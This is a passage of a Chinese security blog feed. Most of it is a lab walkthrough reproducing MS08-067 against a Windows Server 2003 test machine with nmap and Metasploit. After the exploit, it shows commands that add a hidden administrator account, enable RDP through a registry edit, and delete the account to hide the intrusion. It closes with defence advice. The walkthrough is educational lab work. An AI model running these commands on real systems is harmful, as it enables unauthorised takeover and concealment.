-Force</span><br></pre></td></tr></table></figure></li></ul></li><li><p>若无业务需要，在网络安全域边界防火墙封堵文件打印和共享端口TCP 135/139/445以缓解此问题。</p></li><li><p>可以通过安全厂商的漏洞检验和修复工具来检查是否存在漏洞和进行漏洞修复。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-漏洞背景&quot;&gt;&lt;a href=&quot;#1-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞背景&quot;&gt;&lt;/a&gt;1. 漏洞背景&lt;/h1&gt;&lt;h2 id=&quot;1-1-漏洞描述&quot;&gt;&lt;a href=&quot;#1-1-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;1.1 漏洞描述&quot;&gt;&lt;/a&gt;1.1 漏洞描述&lt;/h2&gt;&lt;p&gt;CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>MS08-067漏洞复现及防御机制</title>
    <link href="http://example.com/posts/fa648f2b.html"/>
    <id>http://example.com/posts/fa648f2b.html</id>
    <published>2022-05-25T01:02:44.954Z</published>
    <updated>2022-05-28T00:30:27.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。</p><span id="more"></span><p>当用户在受影响的系统上收到RPC请求时，该漏洞会允许远程执行代码，攻击者可以在未经身份验证情况下利用此漏洞运行任意代码。同时，该漏洞可以用于蠕虫攻击。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的<code>NetPathCanonicalize()</code>函数时触发的。<code>NetPathCanonicalize()</code>函数在远程访问其它主机时，会调用<code>NetpwPathCanonicalize()</code>函数，对远程访问的路径进行规范化，而在<code>NetpwPathCanonicalize()</code>函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。</p><p>所谓路径规范化，就是将路径字符串中的【/】转换为【\】，同时去除相对路径【.\】和【..\】。</p><p>在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除【…\】字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。</p><p>详细请看：</p><p><a href="https://www.cnblogs.com/justforfun12/p/5239941.html">https://www.cnblogs.com/justforfun12/p/5239941.html</a> </p><p><a href="https://bbs.pediy.com/thread-251219.htm">https://bbs.pediy.com/thread-251219.htm</a></p><p><a href="https://www.freebuf.com/vuls/203881.html">https://www.freebuf.com/vuls/203881.html</a></p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>它影响了某些旧版本的Windows系统，包括：Windows 2000 、Windows XP 、Windows Server 2003。</p><h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-常见的端口"><a href="#2-1-常见的端口" class="headerlink" title="2.1 常见的端口"></a>2.1 常见的端口</h2><img src="/posts/fa648f2b/2.1.1.jpg" class="" title="常见的端口"><p>黑客通过端口可以做信息收集、目标探测、服务判断、系统判断、角色分析。</p><h2 id="2-2-445端口"><a href="#2-2-445端口" class="headerlink" title="2.2 445端口"></a>2.2 445端口</h2><p>135、137、138、139和445端口都是与文件共享和打印机共享有关的端口，而且在这几个端口上经常爆发很严重的漏洞。比如2017年危害全球的永恒之蓝，就是利用的445端口。</p><p>445端口就是利用SMB（Server Message Block）Windows协议族，用于文件共享、打印共享的服务。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！</p><p>总之，公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest 帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭139和445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。</p><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows Server 2003  x86 企业版（IP地址：192.168.193.132）</p><p>利用工具：MSF</p><h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>打开Windows Server 2003，确定445端口开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/2.2.1.png" class="" title="查看是否开启445端口"><p>关闭Win 2003系统的防火墙：</p><img src="/posts/fa648f2b/2.2.2.png" class="" title="关闭系统防火墙"><h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>利用nmap扫描靶机的端口及确认该漏洞是否存在。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -p 445 --script smb-vuln-ms08-067 192.168.193.132 --open</span><br></pre></td></tr></table></figure><ul><li>-n：不要进行DNS解析</li><li>-p：后接端口号</li><li>—script：使用脚本进行扫描</li><li>—open：仅显示打开（或可能打开）的端口</li></ul><p>nmap漏扫脚本目录默认为“/usr/share/nmap/script/”，如下图所示，扫描结果为VULNERABLE，表示漏洞存在且可以利用。</p><img src="/posts/fa648f2b/3.3.1.png" class="" title="扫描目标靶机的端口及确认该漏洞是否存在"><p>当然，我们一开始肯定不知道这么多信息，还不会用这么长的命令，那我们可以先确定靶机开放的端口和版本号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn 192.168.193.132</span><br></pre></td></tr></table></figure><ul><li>-sV：探测打开的端口以确定服务/版本信息</li><li>-Pn：将所有主机视为在线，也就是跳过主机发现</li></ul><img src="/posts/fa648f2b/3.3.2.png" class="" title="探测打开的端口以确定服务&#x2F;版本信息"><p>做安全行业的，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。要是实在不知道，那我们还可以查百度嘛。</p><p>进入MSF，搜索MS08-067，这些步骤都在 <a href="https://v5le0n9.github.io/posts/2d03ac3f.html">CVE-2019-0708</a> 都讲过，不再赘述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms08-067</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.3.png" class="" title="搜索MS08-067"><p>查找到一个漏洞利用模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">show targets</span><br></pre></td></tr></table></figure><p>查看选项，缺少rhosts，所以要设置靶机IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.193.132 </span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.4.png" class="" title="设置靶机IP"><p>查看目标，找到与靶机匹配的信息。刚才我们已经用nmap -sV知道靶机是Windows Server 2003系统，但还是不知道具体信息（<strong>所以这种情况怎么才能知道具体信息？</strong>）。由于我知道靶机是Win 2003 SP2的，所以直接选目标74，如果实在没有更多信息那设置为自动目标(0)就好。</p><img src="/posts/fa648f2b/3.3.7.png" class="" title="设置target"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set target 74</span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.5.png" class="" title="成功提权"><p>成功控制住靶机。我们可以用Linux或Windows窗口命令查看靶机的基本信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig#查看IP地址</span><br><span class="line">pwd#查看当前所在位置</span><br><span class="line">sysinfo#查看操作系统信息</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.9.png" class="" title="成功提权"><img src="/posts/fa648f2b/3.3.10.png" class="" title="成功提权"><p>后来做了set target 0的实验，MSF会自动检测系统版本并选择目标，但它默认选择English版本，这可能是没有成功建立会话的原因之一。</p><img src="/posts/fa648f2b/3.3.16.png" class="" title="提权失败"><p>此时将它修改为74也不行了，提示我们“这很可能意味着先前的攻击尝试导致服务崩溃”。</p><img src="/posts/fa648f2b/3.3.17.png" class="" title="提权失败"><p>如果多run几次还会导致Win 2003系统内存溢出错误。</p><img src="/posts/fa648f2b/3.3.18.png" class="" title="内存溢出错误"><p>这种情况好像只能等靶机重新开机，才能利用前几次攻击失败的经验继续渗透。</p><h3 id="3-3-1-创建文件"><a href="#3-3-1-创建文件" class="headerlink" title="3.3.1 创建文件"></a>3.3.1 创建文件</h3><p>尝试在靶机上创建文件夹和文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir hacker</span><br><span class="line">cd hacker</span><br><span class="line">shell#进入靶机命令窗口</span><br><span class="line">echo v5le0n9&gt;test.txt</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.6.png" class="" title="在靶机创建目录"><img src="/posts/fa648f2b/3.3.8.png" class="" title="在靶机创建目录"><h3 id="3-3-2-创建用户"><a href="#3-3-2-创建用户" class="headerlink" title="3.3.2 创建用户"></a>3.3.2 创建用户</h3><p>Windows DOM用户常用命令如下：</p><ul><li><strong>net user abcd 1234 /add</strong><br>新建一个用户名为abcd，密码为1234的帐户，默认为user组成员</li><li><strong>net user abcd /del</strong><br>将用户名为abcd的用户删除</li><li><strong>net user abcd /active:no</strong><br>将用户名为abcd的用户禁用</li><li><strong>net user abcd /active:yes</strong><br>激活用户名为abcd的用户</li><li><strong>net user abcd</strong><br>查看用户名为abcd的用户的情况</li><li><strong>net localgroup administrators abcd /add</strong><br>将abcd账户给予管理员权限</li></ul><p>创建一个名为v5le0n9，密码为123456的普通用户，给予管理员权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 123456 /add#增加普通用户</span><br><span class="line">net localgroup administrators v5le0n9 /add#提升管理员权限</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.11.png" class="" title="提升管理员权限"><p>在Win 2003中能看到新创建了一个用户v5le0n9。</p><img src="/posts/fa648f2b/3.3.13.png" class="" title="提升管理员权限"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f &gt; C:\WINDOWS\system32\3389.bat &amp;&amp; call 3389.bat# 开启远程连接</span><br><span class="line">netstat -an# 查看网络端口</span><br><span class="line">rdesktop 192.168.193.132# 远程连接</span><br></pre></td></tr></table></figure><p>开启远程连接3389端口，使用Kali远程登录靶机。</p><img src="/posts/fa648f2b/3.3.12.png" class="" title="开启远程连接3389端口"><p>最后一定要把我们新建的用户名删除，假装没来过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 /del</span><br></pre></td></tr></table></figure><p>虽然不能远程登录了，但靶机<code>C:\Documents and Settings</code>目录下还是有v5le0n9文件夹，<strong>怎么删不掉呢？！</strong></p><img src="/posts/fa648f2b/3.3.15.png" class="" title="删除用户名"><img src="/posts/fa648f2b/3.3.14.png" class="" title="删除用户名"><h1 id="4-防御方法"><a href="#4-防御方法" class="headerlink" title="4. 防御方法"></a>4. 防御方法</h1><ul><li>关闭相关端口、安装杀毒软件和补丁</li><li>在防火墙中进行流量监测，主要是针对数据包中存在的形如“\ ** \ … \ … \ *”这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-漏洞背景&quot;&gt;&lt;a href=&quot;#1-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞背景&quot;&gt;&lt;/a&gt;1. 漏洞背景&lt;/h1&gt;&lt;h2 id=&quot;1-1-漏洞概述&quot;&gt;&lt;a href=&quot;#1-1-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;1.1 漏洞概述&quot;&gt;&lt;/a&gt;1.1 漏洞概述&lt;/h2&gt;&lt;p&gt;MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
